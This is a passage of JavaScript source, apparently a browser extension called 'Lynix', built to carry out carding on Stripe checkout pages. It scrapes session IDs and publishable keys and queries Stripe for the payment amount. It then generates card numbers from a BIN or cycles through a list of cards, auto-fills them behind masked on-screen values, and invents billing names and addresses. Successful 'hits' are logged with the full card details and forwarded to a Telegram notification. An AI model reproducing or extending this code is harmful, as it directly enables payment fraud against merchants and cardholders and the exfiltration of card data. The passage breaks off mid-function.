        if (!amount && data.line_item_group?.total && data.line_item_group.total > 0) {
          amount = data.line_item_group.total;
          originalCurrency = data.line_item_group.currency || data.currency;
        }

        if (!amount && data.line_item_group?.due && data.line_item_group.due > 0) {
          amount = data.line_item_group.due;
          originalCurrency = data.line_item_group.currency || data.currency;
        }

        if (!amount && data.line_item_group?.line_items?.[0]) {
          const lineItem = data.line_item_group.line_items[0];
          if (lineItem.total && lineItem.total > 0) {
            amount = lineItem.total;
            originalCurrency = data.line_item_group.currency || data.currency;
          } else if (lineItem.price?.unit_amount && lineItem.price.unit_amount > 0) {
            amount = lineItem.price.unit_amount * (lineItem.quantity || 1);
            originalCurrency = lineItem.price.currency || data.currency;
          }
        }

        if (!amount && data.amount && typeof data.amount === "number" && data.amount > 0) {
          amount = data.amount;
        }
        if (!amount && data.payment_intent?.amount && data.payment_intent.amount > 0) {
          amount = data.payment_intent.amount;
        }
        if (!amount && data.invoice?.amount_due && data.invoice.amount_due > 0) {
          amount = data.invoice.amount_due;
        }
        if (!amount && data.invoice?.lines?.data?.[0]?.amount && data.invoice.lines.data[0].amount > 0) {
          amount = data.invoice.lines.data[0].amount;
        }
        if (!amount && data.amount_received && data.amount_received > 0) {
          amount = data.amount_received;
        }
        if (!amount && data.amount_capturable && data.amount_capturable > 0) {
          amount = data.amount_capturable;
        }
        if (!amount && data.lines?.data?.[0]?.amount && data.lines.data[0].amount > 0) {
          amount = data.lines.data[0].amount;
        }
        if (!amount && data.line_items?.data?.[0]?.amount_total && data.line_items.data[0].amount_total > 0) {
          amount = data.line_items.data[0].amount_total;
        }
        if (!amount && data.amount_total && data.amount_total > 0) {
          amount = data.amount_total;
        }
        if (!amount && data.amount_due && data.amount_due > 0) {
          amount = data.amount_due;
        }
        if (!amount && data.amount_paid && data.amount_paid > 0) {
          amount = data.amount_paid;
        }
        if (!amount && data.total && data.total > 0) {
          amount = data.total;
        }

        if (!amount) {
          const unitAmount = findValue(data, "unit_amount_decimal");
          if (unitAmount && parseInt(unitAmount) > 0) {
            amount = parseInt(unitAmount);
          }
        }
        if (!amount) {
          const unitAmount = findValue(data, "unit_amount");
          if (unitAmount && parseInt(unitAmount) > 0) {
            amount = parseInt(unitAmount);
          }
        }

        if (!amount) {
          const piAmount = findValue(data, "payment_intent");
          if (piAmount && typeof piAmount === "object" && piAmount.amount && piAmount.amount > 0) {
            amount = piAmount.amount;
          }
        }

        if (amount !== null && amount > 0) {
          extractedPaymentData.amount = (Number.parseInt(amount) / 100).toFixed(2);
          if (originalCurrency) {
            extractedPaymentData.currency = originalCurrency.toLowerCase();
          }
          updated = true;
        }
      } catch (e) {
      }
    }

    if (!extractedPaymentData.currency) {
      try {
        let currency = null;

        if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
          const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
          if (usdMeta) {
            currency = 'usd';
          }
        }

        if (!currency && data.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          currency = data.line_item_group.presentment_exchange_rate_meta.integration_currency;
        }

        if (!currency) {
          currency =
            data.line_item_group?.currency ||
            data.currency ||
            data.line_items?.data?.[0]?.currency ||
            findValue(data, "currency");
        }

        if (currency) {
          extractedPaymentData.currency = currency.toLowerCase()
          updated = true
        }
      } catch (e) { }
    }

    if (!extractedPaymentData.businessUrl) {
      try {
        let businessUrl = null;
        if (data.business_url) {
          businessUrl = data.business_url;
        }
        else if (data.account_settings?.business_url) {
          businessUrl = data.account_settings.business_url;
        }
        else if (data.merchant_business_url) {
          businessUrl = data.merchant_business_url;
        }
        else if (data.account_settings?.display_name) {
          businessUrl = data.account_settings.display_name;
        }
        else if (data.account_settings?.order_summary_display_name) {
          businessUrl = data.account_settings.order_summary_display_name;
        }
        else if (data.statement_descriptor) {
          businessUrl = data.statement_descriptor;
        }
        else {
          const displayName = findValue(data, "display_name");
          if (displayName) {
            businessUrl = displayName;
          }
        }
        if (!businessUrl) {
          businessUrl = findValue(data, "business_url");
        }
        if (businessUrl) {
          extractedPaymentData.businessUrl = cleanBusinessUrl(businessUrl);
          updated = true;
        }
      } catch (e) { }
    }
    const hasAllValues = Object.values(extractedPaymentData).every((x) => x !== "")
    if (hasAllValues) {
      paymentDataFound = true

      if (extractedPaymentData.businessUrl) {
        checkBinRecommendation(extractedPaymentData.businessUrl);
      }
    } else if (updated) {
      if (!extractedPaymentData.businessUrl) {
        try {

          let hostname = window.location.hostname;
          hostname = hostname.replace(/^(checkout|pay|billing|buy)\./, '');
          hostname = hostname.replace(/^www\./, '');
          extractedPaymentData.businessUrl = hostname;
        } catch (e) { }
      }
      if (!extractedPaymentData.successUrl) {
        try {
          extractedPaymentData.successUrl = window.location.href
        } catch (e) { }
      }

      if (extractedPaymentData.businessUrl && !binRecommendationShown) {
        checkBinRecommendation(extractedPaymentData.businessUrl);
      }
    }
  }
  function extractCsLive(urlOrString) {
    if (!urlOrString || typeof urlOrString !== "string") return null
    const liveUrlPathMatch = urlOrString.match(/\/c\/pay\/(cs_live_[a-zA-Z0-9]+)(?:[#\/]|$)/)
    if (liveUrlPathMatch) return liveUrlPathMatch[1]
    const livePaymentPagesMatch = urlOrString.match(/\/payment_pages\/(cs_live_[a-zA-Z0-9]+)/)
    if (livePaymentPagesMatch) return livePaymentPagesMatch[1]
    const liveCheckoutMatch = urlOrString.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_live_[a-zA-Z0-9]+)/)
    if (liveCheckoutMatch) return liveCheckoutMatch[1]
    const liveBoundaryMatch = urlOrString.match(/cs_live_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/)
    if (liveBoundaryMatch) return liveBoundaryMatch[0]
    const testUrlPathMatch = urlOrString.match(/\/c\/pay\/(cs_test_[a-zA-Z0-9]+)(?:[#\/]|$)/)
    if (testUrlPathMatch) return testUrlPathMatch[1]
    const testPaymentPagesMatch = urlOrString.match(/\/payment_pages\/(cs_test_[a-zA-Z0-9]+)/)
    if (testPaymentPagesMatch) return testPaymentPagesMatch[1]
    const testCheckoutMatch = urlOrString.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_test_[a-zA-Z0-9]+)/)
    if (testCheckoutMatch) return testCheckoutMatch[1]
    const testBoundaryMatch = urlOrString.match(/cs_test_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/)
    if (testBoundaryMatch) return testBoundaryMatch[0]
    return null
  }
  function extractPkLive() {
    const pageContent = document.documentElement.innerHTML
    const pkLiveMatch = pageContent.match(/pk_live_[a-zA-Z0-9]+/)
    if (pkLiveMatch) return pkLiveMatch[0]
    const scripts = document.querySelectorAll("script")
    for (const script of scripts) {
      const content = script.textContent || script.innerText || ""
      const liveMatch = content.match(/pk_live_[a-zA-Z0-9]+/)
      if (liveMatch) return liveMatch[0]
    }
    try {
      const stripeElements = document.querySelectorAll("[data-stripe-publishable-key]")
      for (const el of stripeElements) {
        const key = el.getAttribute("data-stripe-publishable-key")
        if (key && key.startsWith("pk_live_")) return key
      }
    } catch (e) { }
    const pkTestMatch = pageContent.match(/pk_test_[a-zA-Z0-9]+/)
    if (pkTestMatch) return pkTestMatch[0]
    for (const script of scripts) {
      const content = script.textContent || script.innerText || ""
      const testMatch = content.match(/pk_test_[a-zA-Z0-9]+/)
      if (testMatch) return testMatch[0]
    }
    try {
      const stripeElements = document.querySelectorAll("[data-stripe-publishable-key]")
      for (const el of stripeElements) {
        const key = el.getAttribute("data-stripe-publishable-key")
        if (key && key.startsWith("pk_test_")) return key
      }
    } catch (e) { }
    return null
  }
  async function fetchStripePaymentPageInit(csLive, pkLive) {
    if (!csLive) {
      throw new Error("cs_live identifier is required")
    }
    if (!pkLive) {
      throw new Error("pk_live publishable key is required")
    }
    const initUrl = `https://api.stripe.com/v1/payment_pages/${csLive}/init`
    const formData = new URLSearchParams({
      key: pkLive,
      eid: "NA",
      browser_locale: navigator.language || "en-US",
      browser_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
      redirect_type: "url"
    })
    try {
      const response = await fetch(initUrl, {
        method: "POST",
        headers: {
          "authority": "api.stripe.com",
          "accept": "application/json",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": navigator.userAgent
        },
        body: formData.toString()
      })
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }
      return await response.json()
    } catch (error) {
      throw error
    }
  }
  function extractAmountFromInitResponse(data) {
    if (!data || typeof data !== "object") {
      return {
        amount: null,
        currency: null,
        rawAmount: null,
        email: null,
        businessUrl: null,
        successUrl: null,
        cancelUrl: null,
        merchantName: null,
        productName: null,
        productDescription: null,
        interval: null,
        sessionId: null
      }
    }
    const result = {
      amount: null,
      rawAmount: null,
      currency: null,
      email: null,
      businessUrl: null,
      merchantName: null,
      successUrl: null,
      cancelUrl: null,
      productName: null,
      productDescription: null,
      interval: null,
      sessionId: null,
      mode: null,
      status: null
    }

    function cleanUrl(url) {
      if (!url) return null;
      let clean = url.toString().trim();
      clean = clean.replace(/^https?:\/\//, '');
      clean = clean.replace(/^www\./, '');
      clean = clean.split('/')[0];
      clean = clean.split('?')[0];
      clean = clean.split('#')[0];
      clean = clean.split(':')[0];
      return clean || null;
    }

    let rawAmount = null
    let currency = null

    if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
      const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
      if (usdMeta && usdMeta.total && usdMeta.total > 0) {
        rawAmount = usdMeta.total;
        currency = 'usd';
      }
    }

    if (!rawAmount && data.line_item_group?.presentment_exchange_rate_meta) {
      const meta = data.line_item_group.presentment_exchange_rate_meta;
      if (meta.integration_currency && meta.exchange_rate && data.line_item_group.total) {
        const exchangeRate = parseFloat(meta.exchange_rate);
        if (exchangeRate > 0) {
          rawAmount = Math.round(data.line_item_group.total / exchangeRate);
          currency = meta.integration_currency;
        }
      }
    }

    if (!rawAmount && data.line_item_group?.total !== undefined && data.line_item_group.total > 0) {
      rawAmount = data.line_item_group.total;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.due !== undefined && data.line_item_group.due > 0) {
      rawAmount = data.line_item_group.due;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.subtotal !== undefined && data.line_item_group.subtotal > 0) {
      rawAmount = data.line_item_group.subtotal;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.line_items?.[0]) {
      const item = data.line_item_group.line_items[0];
      if (item.total && item.total > 0) {
        rawAmount = item.total;
        currency = data.line_item_group.currency;
      } else if (item.price?.unit_amount && item.price.unit_amount > 0) {
        rawAmount = item.price.unit_amount * (item.quantity || 1);
        currency = item.price.currency || data.line_item_group.currency;
      }
    }

    if (!rawAmount && data.invoice?.amount_due !== undefined && data.invoice.amount_due > 0) {
      rawAmount = data.invoice.amount_due;
      currency = data.invoice.currency;
    }
    if (!rawAmount && data.invoice?.total !== undefined && data.invoice.total > 0) {
      rawAmount = data.invoice.total;
      currency = data.invoice.currency;
    }
    if (!rawAmount && data.invoice?.lines?.data?.[0]?.amount !== undefined) {
      rawAmount = data.invoice.lines.data[0].amount;
      currency = data.invoice.currency;
    }

    if (!rawAmount && data.amount_total !== undefined && data.amount_total > 0) {
      rawAmount = data.amount_total;
    }
    if (!rawAmount && data.amount !== undefined && typeof data.amount === 'number' && data.amount > 0) {
      rawAmount = data.amount;
    }
    if (!rawAmount && data.payment_intent?.amount !== undefined && data.payment_intent.amount > 0) {
      rawAmount = data.payment_intent.amount;
      currency = data.payment_intent.currency;
    }

    if (!rawAmount && data.amount_due !== undefined && data.amount_due > 0) {
      rawAmount = data.amount_due;
    }
    if (!rawAmount && data.amount_paid !== undefined && data.amount_paid > 0) {
      rawAmount = data.amount_paid;
    }

    if (rawAmount !== null && rawAmount > 0) {
      result.rawAmount = rawAmount;
      result.amount = (Number(rawAmount) / 100).toFixed(2);
    }

    result.currency = currency || data.currency || data.line_item_group?.currency || data.invoice?.currency || "usd";

    result.email = data.customer_email || data.customer?.email || null;

    let rawBusinessUrl = null;
    if (data.account_settings?.business_url) {
      rawBusinessUrl = data.account_settings.business_url;
    } else if (data.account_settings?.display_name) {

      const displayName = data.account_settings.display_name;
      if (displayName.includes('.') && !displayName.includes(' ')) {
        rawBusinessUrl = displayName;
      }
    }
    if (!rawBusinessUrl && data.statement_descriptor) {
      const stmt = data.statement_descriptor;
      if (stmt.includes('.')) {
        rawBusinessUrl = stmt;
      }
    }
    result.businessUrl = cleanUrl(rawBusinessUrl);

    result.merchantName = data.account_settings?.display_name ||
      data.account_settings?.order_summary_display_name ||
      data.account_settings?.merchant_of_record_display_name || null;

    result.successUrl = data.success_url || null;
    result.cancelUrl = data.cancel_url || null;

    const lineItem = data.line_item_group?.line_items?.[0] || data.invoice?.lines?.data?.[0];
    if (lineItem) {
      result.productName = lineItem.name || lineItem.price?.product?.name || null;
      result.productDescription = lineItem.description || lineItem.price?.product?.description || null;
      result.interval = lineItem.price?.recurring?.interval || null;
    }

    result.sessionId = data.session_id || null;
    result.mode = data.mode || null;
    result.status = data.status || null;

    return result;
  }
  function fallbackExtractFromPage() {
    const result = {
      amount: null,
      currency: null,
      email: null,
      businessUrl: null,
      successUrl: null,
      method: "fallback_dom"
    }
    try {
      const pageContent = document.documentElement.innerHTML
      const pricePatterns = [
        /\$(\d+(?:\.\d{2})?)/,
        /(\d+(?:\.\d{2})?)\s*(?:USD|CAD|EUR|GBP)/i,
        /"amount":\s*(\d+)/,
        /"unit_amount":\s*(\d+)/,
        /"unit_amount_decimal":\s*"(\d+)"/
      ]
      for (const pattern of pricePatterns) {
        const match = pageContent.match(pattern)
        if (match) {
          const rawAmount = match[1]
          if (rawAmount.length > 2 && !rawAmount.includes('.')) {
            result.amount = (Number(rawAmount) / 100).toFixed(2)
          } else {
            result.amount = Number(rawAmount).toFixed(2)
          }
          break
        }
      }
      const emailMatch = pageContent.match(/"customer_email":\s*"([^"]+)"/) ||
        pageContent.match(/"email":\s*"([^"]+@[^"]+)"/)
      if (emailMatch) result.email = emailMatch[1]
      const businessUrlMatch = pageContent.match(/"business_url":\s*"([^"]+)"/)
      if (businessUrlMatch) result.businessUrl = businessUrlMatch[1]
      const successUrlMatch = pageContent.match(/"success_url":\s*"([^"]+)"/) ||
        pageContent.match(/"return_url":\s*"([^"]+)"/)
      if (successUrlMatch) result.successUrl = successUrlMatch[1]
      const currencyMatch = pageContent.match(/"currency":\s*"([a-z]{3})"/i)
      if (currencyMatch) result.currency = currencyMatch[1]
    } catch (error) {
    }
    return result
  }
  async function getStripePaymentAmount(urlOrResponse, providedPkLive = null) {
    if (isInvoiceStripePage()) {
      const invData = extractInvoiceData();
      if (invData) {
        const displayName = getInvoiceDisplayName();
        Object.assign(extractedPaymentData, {
          amount: getInvoiceAmount(),
          rawAmount: invData.amount,
          currency: invData.currency,
          email: invData.email,
          businessUrl: invData.businessUrl || displayName,
          merchantName: displayName,
          productName: invData.productName
        });
        return {
          success: true,
          csLive: null,
          pkLive: null,
          amount: getInvoiceAmount(),
          rawAmount: invData.amount,
          currency: invData.currency,
          email: invData.email,
          businessUrl: invData.businessUrl || displayName,
          merchantName: displayName,
          productName: invData.productName,
          method: "invoice_extract"
        };
      }
    }

    const csLive = extractCsLive(urlOrResponse)
    const pkLive = providedPkLive || extractPkLive()
    if (csLive && pkLive) {
      try {
        const initResponse = await fetchStripePaymentPageInit(csLive, pkLive)
        const paymentDetails = extractAmountFromInitResponse(initResponse)
        paymentDetails.method = "init_request"
        Object.assign(extractedPaymentData, {
          amount: paymentDetails.amount,
          rawAmount: paymentDetails.rawAmount,
          currency: paymentDetails.currency,
          email: paymentDetails.email,
          businessUrl: paymentDetails.businessUrl,
          successUrl: paymentDetails.successUrl,
          cancelUrl: paymentDetails.cancelUrl,
          merchantName: paymentDetails.merchantName,
          productName: paymentDetails.productName,
          productDescription: paymentDetails.productDescription,
          interval: paymentDetails.interval,
          sessionId: paymentDetails.sessionId,
          mode: paymentDetails.mode,
          status: paymentDetails.status
        })
        return {
          success: true,
          csLive: csLive,
          pkLive: pkLive,
          ...paymentDetails,
          rawResponse: initResponse
        }
      } catch (error) {
      }
    } else {
    }
    const fallbackDetails = fallbackExtractFromPage()
    if (fallbackDetails.amount || fallbackDetails.email || fallbackDetails.businessUrl) {
      if (fallbackDetails.amount) extractedPaymentData.amount = fallbackDetails.amount
      if (fallbackDetails.currency) extractedPaymentData.currency = fallbackDetails.currency
      if (fallbackDetails.email) extractedPaymentData.email = fallbackDetails.email
      if (fallbackDetails.businessUrl) extractedPaymentData.businessUrl = fallbackDetails.businessUrl
      if (fallbackDetails.successUrl) extractedPaymentData.successUrl = fallbackDetails.successUrl
      return {
        success: true,
        csLive: csLive,
        pkLive: pkLive,
        ...fallbackDetails
      }
    }
    return {
      success: false,
      error: "Could not extract payment data using any method",
      csLive: csLive,
      pkLive: pkLive
    }
  }
  async function autoExtractPaymentFromUrl() {
    const currentUrl = window.location.href
    const result = await getStripePaymentAmount(currentUrl)
    if (result.success) {
    } else {
    }
    return result
  }
  window.lynixStripeUtils = {
    extractCsLive,
    extractPkLive,
    fetchStripePaymentPageInit,
    extractAmountFromInitResponse,
    fallbackExtractFromPage,
    getStripePaymentAmount
  }
  async function checkResponseForSuccess(response) {
    return response
  }
  async function checkResponseForDeclineCodes(response) {
    return response
  }
  async function handleSuccess() {
    if (attemptCount === 0 || !attemptCount) {
      return
    }
    if (hasHit || hasNotified) {
      return
    }
    hasNotified = true
    hasHit = true
    let timeTaken = "0s"
    if (cardAttemptStartTime) {
      const elapsed = Math.round((Date.now() - cardAttemptStartTime) / 1000)
      const mins = Math.floor(elapsed / 60)
      const secs = elapsed % 60
      timeTaken = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`
    }
    if (isAutoSubmitting) {
      stopAutoSubmit()
    }
    if (window.generatedCardFull) {
      const parts = window.generatedCardFull.split("|")
      addToHistory(parts[0], parts[1], parts[2], parts[3], "SUCCESS")
    } else if (window.generatedCard) {
      addToHistory(window.generatedCard, "??", "??", "???", "SUCCESS")
    } else {
      addToHistory("Unknown", "??", "??", "???", "SUCCESS")
    }
    // Update checkout hits counter on status card
    const chEl = document.getElementById("lxCheckoutHits")
    if (chEl) chEl.textContent = parseInt(chEl.textContent || "0") + 1
    const thEl = document.getElementById("lxTotalHits")
    if (thEl) thEl.textContent = parseInt(thEl.textContent || "0") + 1

    showSuccessToast(attemptCount, timeTaken)
    createColorBallDrop()
    autoDownloadPaymentScreenshot()

    // Swap aggressive dark mode for a softer version that lets Stripe success content show
    const darkStyle = document.getElementById("lx-dark-mode-style")
    if (darkStyle) {
      darkStyle.textContent = `
        html, body {
          background-color: #0a0a0a !important;
          color: #ffffff !important;
        }
        * {
          color: #ffffff !important;
          border-color: #333 !important;
        }
        img, svg, video, canvas, iframe { filter: none !important; }
      `
    }
    // Also remove custom bg if present
    const bgStyle = document.getElementById("lx-bg-style")
    if (bgStyle) bgStyle.remove()

    const key = "cardGeneratorHit_" + window.location.href
    localStorage.setItem(key, "true")
    window.postMessage({ type: "PLAY_SUCCESS_SOUND", volume: soundVolume }, "*")

    // Always record hit locally, regardless of login state
    if (window.generatedCardFull && attemptCount > 0) {
      const hitAmount = extractedPaymentData.amount || '0';
      const hitCurrency = extractedPaymentData.currencyCode || 'usd';
      const hitMerchant = extractedPaymentData.businessUrl || window.location.hostname;
      await recordHit(localStorage.getItem(K.TOKEN), {
        fullCard: window.generatedCardFull,
        amount: hitAmount,
        currency: hitCurrency,
        merchant: hitMerchant,
        timeTaken: timeTaken
      });
      // Persist a hit log with card + amount for the dashboard
      persistLog('HIT', 'hit', window.generatedCardFull, hitAmount + ' ' + hitCurrency.toUpperCase());
    }

    if (!extractedPaymentData.businessUrl) {
      extractedPaymentData.businessUrl = window.location.hostname || window.location.origin
    }
    if (!extractedPaymentData.successUrl) {
      extractedPaymentData.successUrl = window.location.href
    }
    window.postMessage(
      {
        type: "SEND_TELEGRAM_NOTIFICATION",
        data: {
          ...extractedPaymentData,
          cardNumber: window.generatedCardFull || window.generatedCard || "",
          bin: getSavedBIN() || "",
          tgForwardEnabled: tgForwardEnabled,
          userId: userId || savedId || "",
          userName: customName || userFirstName || "",
          attempt: attemptCount,
          timeTaken: timeTaken,
        },
      },
      "*",
    )
  }
  function autoDownloadPaymentScreenshot() {
    window.postMessage({ type: 'CAPTURE_SCREENSHOT_REQUEST' }, '*')
  }
  function showSuccessToast(attempt, timeTaken) {
    const existing = document.querySelector(".success-toast")
    if (existing) existing.remove()
    const now = new Date()
    let hours = now.getHours()
    const minutes = String(now.getMinutes()).padStart(2, '0')
    const ampm = hours >= 12 ? 'PM' : 'AM'
    hours = hours % 12
    hours = hours ? hours : 12
    const timeStr = String(hours).padStart(2, '0') + '.' + minutes + ampm
    const day = String(now.getDate()).padStart(2, '0')
    const month = String(now.getMonth() + 1).padStart(2, '0')
    const year = String(now.getFullYear()).slice(-2)
    const dateStr = day + '|' + month + '|' + year
    const toast = document.createElement("div")
    toast.className = "success-toast"
    toast.innerHTML = `
    <div class="st-accent"></div>
    <div class="st-body">
      <div class="st-icon">
        <svg class="st-check-svg" width="22" height="22" viewBox="0 0 24 24" fill="none">
          <circle class="st-check-circle" cx="12" cy="12" r="10" stroke="#22c55e" stroke-width="1.5"/>
          <path class="st-check-path" d="M8 12.5l2.5 3L16 9" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <div class="st-text">
        <span class="st-title">Payment Successful</span>
        <span class="st-sub">Attempt <b>${attempt}</b> · ${timeTaken}</span>
      </div>
      <div class="st-meta">${timeStr} · ${dateStr}</div>
    </div>
  `
    document.body.appendChild(toast)
    toast.classList.add("show")
  }

  function createColorBallDrop() {
    const container = document.createElement("div")
    container.className = "color-ball-container"
    document.body.appendChild(container)
    function createBall() {
      const ball = document.createElement("div")
      const posClass = "ball-pos-" + Math.floor(Math.random() * 20) * 5
      const sizeClass = "ball-size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)]
      const colorClass = "ball-color-" + Math.floor(Math.random() * 8)
      const delayClass = "ball-delay-" + Math.floor(Math.random() * 10)
      const durationClass = "ball-dur-" + Math.floor(Math.random() * 3)
      ball.className = `color-ball ${posClass} ${sizeClass} ${colorClass} ${delayClass} ${durationClass}`
      container.appendChild(ball)
      setTimeout(() => ball.remove(), 6000)
    }
    for (let i = 0; i < 50; i++) {
      createBall()
    }
    const spawnInterval = setInterval(() => {
      if (!document.body.contains(container)) {
        clearInterval(spawnInterval)
        return
      }
      for (let i = 0; i < 10; i++) {
        createBall()
      }
    }, 500)
  }
  const randomNames = [
    "LynixCO",
  ]
  const randomHumanNames = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
    "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen",
    "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth",
    "Nancy", "Betty", "Margaret", "Sandra", "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle",
    "Alex", "Chris", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn", "Avery", "Cameron"
  ]
  const randomStreets = [
    "Main Street",
    "Oak Road",
    "Park Avenue",
    "Maple Drive",
    "Cedar Lane",
    "Pine Street",
    "Lake Drive",
    "Forest Avenue",
    "River Road",
    "Hill Street",
  ]
  function getRandomName() {
    return randomNames[Math.floor(Math.random() * randomNames.length)]
  }
  function getRandomEmail() {
    const domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"]
    const name = randomHumanNames[Math.floor(Math.random() * randomHumanNames.length)].toLowerCase()
    const randomNum = Math.floor(Math.random() * 9999)
    const domain = domains[Math.floor(Math.random() * domains.length)]
    return name + randomNum + "@" + domain
  }
  function getRandomStreet() {
    const street = randomStreets[Math.floor(Math.random() * randomStreets.length)]
    const number = Math.floor(Math.random() * 999) + 1
    return number + " " + street
  }
  function simulateInput(element, value) {
    if (!element) return
    element.focus()
    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set
    const nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(
      window.HTMLTextAreaElement.prototype,
      "value",
    )?.set
    if (element.tagName === "INPUT" && nativeInputValueSetter) {
      nativeInputValueSetter.call(element, value)
    } else if (element.tagName === "TEXTAREA" && nativeTextAreaValueSetter) {
      nativeTextAreaValueSetter.call(element, value)
    } else {
      element.value = value
    }
    element.dispatchEvent(new Event("input", { bubbles: true }))
    element.dispatchEvent(new Event("change", { bubbles: true }))
    element.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true }))
    element.blur()
  }
  function simulateSelectChange(element, value) {
    if (!element) return
    element.focus()
    element.value = value
    element.dispatchEvent(new Event("input", { bubbles: true }))
    element.dispatchEvent(new Event("change", { bubbles: true }))
    element.dispatchEvent(new CustomEvent("select:change", { bubbles: true, detail: { value } }))
    element.blur()
  }
  const realCardValues = {
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
  }
  async function autoFillForm() {
    let card, mm, yy, cvv
    if (currentMode === "cc") {
      const ccData = getNextCC()
      if (!ccData) {
        showWarning("No more CCs in list", "error")
        stopAutoSubmit()
        return
      }
      card = ccData.number
      mm = ccData.month
      yy = ccData.year
      cvv = ccData.cvv
      const ccInfo = document.querySelector(".cc-info")
      if (ccInfo) ccInfo.textContent = `${currentCCIndex}/${ccList.length} used`
    } else {
      const bin = getSavedBIN()
      if (!bin) return
      const generated = generateCard(bin)
      if (!generated) return
      card = generated.card
      mm = generated.month
      yy = generated.year
      cvv = generated.cvv
    }
    window.generatedCard = card
    window.generatedCardFull = `${card}|${mm}|${yy}|${cvv}`
    realCardValues.cardNumber = card
    realCardValues.cardExpiry = mm + "/" + yy
    realCardValues.cardCvc = cvv
    showCardToast(card, mm, yy, cvv)
    const maskedCard = "0000000000000000"
    const maskedExpiry = "10/28"
    const maskedCvv = "000"

    const fieldMappings = [
      {
        selectors: [
          "#cardNumber", '[name="cardNumber"]', '[autocomplete="cc-number"]',
          '[data-elements-stable-field-name="cardNumber"]',
          'input[placeholder*="Card number"]',
          'input[placeholder*="card number"]',
          'input[aria-label*="Card number"]',
          '[class*="CardNumberInput"] input',
          '[class*="cardNumber"] input',
          'input[name="number"]',
          'input[id*="card-number"]',
          'input[name*="card_number"]',
          'input[placeholder*="0000"]',
          'input[placeholder*="1234"]'
        ],
        value: maskedCard,
        realValue: card,
      },
      {
        selectors: [
          "#cardExpiry", '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
          '[data-elements-stable-field-name="cardExpiry"]',
          'input[placeholder*="MM / YY"]',
          'input[placeholder*="MM/YY"]',
          'input[placeholder*="MM"]',
          'input[aria-label*="expir"]',
          '[class*="CardExpiry"] input',
          '[class*="expiry"] input',
          'input[name="expiry"]',
          'input[name="exp"]'
        ],
        value: maskedExpiry,
        realValue: mm + "/" + yy,
      },
      {
        selectors: [
          "#cardCvc", '[name="cardCvc"]', '[autocomplete="cc-csc"]',
          '[data-elements-stable-field-name="cardCvc"]',
          'input[placeholder*="CVC"]',
          'input[placeholder*="CVV"]',
          'input[aria-label*="CVC"]',
          'input[aria-label*="CVV"]',
          'input[aria-label*="security code"]',
          'input[aria-label*="Security code"]',
          '[class*="CardCvc"] input',
          '[class*="cvc"] input',
          'input[name="cvc"]',
          'input[name="cvv"]'
        ],
        value: maskedCvv,
        realValue: cvv
      },
      {
        selectors: [
          "#billingName", '[name="billingName"]', '[autocomplete="cc-name"]', '[autocomplete="name"]',
          'input[placeholder*="Name on card"]',
          'input[placeholder*="name on card"]',
          'input[aria-label*="Name"]',
          '[class*="billingName"] input',
          'input[name="name"]'
        ],
        value: customName || getRandomName(),
      },
      {
        selectors: [
          'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
          'input[id*="email"]', 'input[placeholder*="email"]', 'input[placeholder*="Email"]',
          '[class*="email"] input',
          'input[aria-label*="email"]'
        ],
        value: customEmail || getRandomEmail(),
      },
      {
        selectors: ["#billingAddressLine1", '[name="billingAddressLine1"]', '[autocomplete="address-line1"]'],
        value: customAddrStreet || getRandomStreet(),
      },
      {
        selectors: ["#billingLocality", '[name="billingLocality"]', '[autocomplete="address-level2"]'],
        value: customAddrCity || "Macau",
      },
      {
        selectors: ["#billingPostalCode", '[name="billingPostalCode"]', '[autocomplete="postal-code"]'],
        value: customAddrZip || "999078",
      },
    ]

    let filledCount = 0;
    for (const mapping of fieldMappings) {
      for (const selector of mapping.selectors) {
        const element = document.querySelector(selector)
        if (element) {
          simulateInput(element, mapping.value)
          if (mapping.realValue) {
            element.dataset.realValue = mapping.realValue
          }
          filledCount++;
          await new Promise((r) => setTimeout(r, 8))
          break
        }
      }
    }

    if (isInvoiceStripePage() || filledCount < 3) {
      await fillStripeElementsIframes(card, mm, yy, cvv);
    }

    const countrySelectors = ["#billingCountry", '[name="billingCountry"]', '[autocomplete="country"]']
    for (const selector of countrySelectors) {
      const element = document.querySelector(selector)
      if (element) {
        simulateSelectChange(element, customAddrCountry || "MO")
        break
      }
    }
    await new Promise((r) => setTimeout(r, 30))
  }

  async function fillStripeElementsIframes(card, mm, yy, cvv) {
    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    const iframes = document.querySelectorAll('iframe[name*="__privateStripeFrame"], iframe[title*="Secure"], iframe[src*="stripe"]');

    for (const iframe of iframes) {
      const name = iframe.name || '';
